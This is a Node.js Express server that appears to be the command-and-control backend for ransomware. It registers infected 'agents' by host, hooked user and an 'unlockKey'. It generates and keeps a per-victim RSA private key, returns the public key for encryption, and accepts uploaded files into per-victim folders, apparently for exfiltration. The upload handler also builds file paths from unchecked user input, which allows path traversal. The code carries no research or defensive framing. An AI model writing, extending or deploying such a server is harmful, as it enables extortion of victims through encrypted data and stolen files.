const express = require('express');
const mysql = require('mysql');
const crypto = require("crypto");
const multer = require("multer");
const fs = require('fs');
const path = require('path');

try {
  const folderName = "/CTHULHU/users"
  if (!fs.existsSync(folderName)) {
    fs.mkdirSync(folderName);
  }
} catch (err) {
  console.log(err)
}

const app = express();
const port = 5000;


app.use(express.json()) // for parsing application/json


// Configure multer with a dynamic destination folder
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "/tmp/");
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  },
});

const upload = multer({ storage });

// Set up MySQL connection
// change the cread to your own
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_MAIN
});

// Connect to MySQL
db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database: ' + err.stack);
    return;
  }
  console.log('Connected to MySQL database as ID ' + db.threadId);
});


// API endpoint for receiving data
app.post('/api/agent/new', (req, res) => {
  console.log("POST api agent new")
  var JSON_RES = { data: {}, error: {} }
  if (
    req.body != undefined &&
    req.body.versionOS != undefined &&
    req.body.host != undefined &&
    req.body.hookUser != undefined &&
    req.body.unlockKey != undefined
  ) {

    // Generate RSA key pair
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem'
      }
    });

    const publicKeyStr = publicKey.toString();

    // Insert data into MySQL
    const sql = `INSERT INTO agent (versionOS, host, hookUser, unlockKey, privKey, pubKey) VALUES (?, ?, ?, ?, ?, ?)`;
    const values = [req.body.versionOS, req.body.host, req.body.hookUser, req.body.unlockKey, privateKey.toString(), publicKeyStr];

    // Insert data into MySQL without keys
    db.query(sql, values, (err, result) => {
      if (err) {
        JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }
      console.log('Inserted data into MySQL with ID ' + result.insertId);
      JSON_RES.data = { id: result.insertId, publicKey: publicKeyStr }

      try {
        const folderName = path.join('/CTHULHU/users', result.insertId.toString());
        if (!fs.existsSync(folderName)) {
          fs.mkdirSync(folderName);
        }
      } catch (err) {
        JSON_RES.error = { errorMsg: err }

        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }

      res.status(200)
      res.json(JSON_RES);
      res.end();
    });

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

app.post('/api/file/upload/:user_folder', upload.single('file'), (req, res) => {
  // Access the uploaded file details
  const file = req.file;
  if (!file) {
    res.status(400).send('No file uploaded.');
    return;
  }

  var JSON_RES = { data: {}, error: {} }

  const sourceFilePath = "/tmp/" + req.file.originalname;
  const destinationFilePath = "/CTHULHU/users/" + req.params.user_folder + "/" + req.file.originalname;

  // Check if the destination file exists
  if (fs.existsSync(destinationFilePath)) {
    // Read the contents of the source file
    fs.readFile(sourceFilePath, (err, data) => {
      if (err) {
        console.error('Error reading the source file:', err);
        return;
      }

      // Append the contents to the destination file
      fs.appendFile(destinationFilePath, data, (err) => {
        if (err) {
          console.error('Error appending to the destination file:', err);
          return;
        }

        console.log('Contents appended successfully!');
      });
    });
  } else {
    // Create the destination file and write the contents of the source file to it
    fs.copyFile(sourceFilePath, destinationFilePath, (err) => {
      if (err) {
        console.error('Error creating the destination file:', err);
        return;
      }

      console.log('Destination file created and contents copied successfully!');
    });
  }

  fs.unlink(sourceFilePath, (err) => {
    if (err) {
      console.error('Error deleting the source file:', err);
      return;
    }

    console.log('Source file deleted successfully!');
  });

  // Do something with the file, such as saving it to a specific location or performing further processing

  JSON_RES.data = { success: `${file.originalname} uploaded successfully.` }

  res.status(200)
  res.json(JSON_RES);
  res.end();
});

// API endpoint for receiving files

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});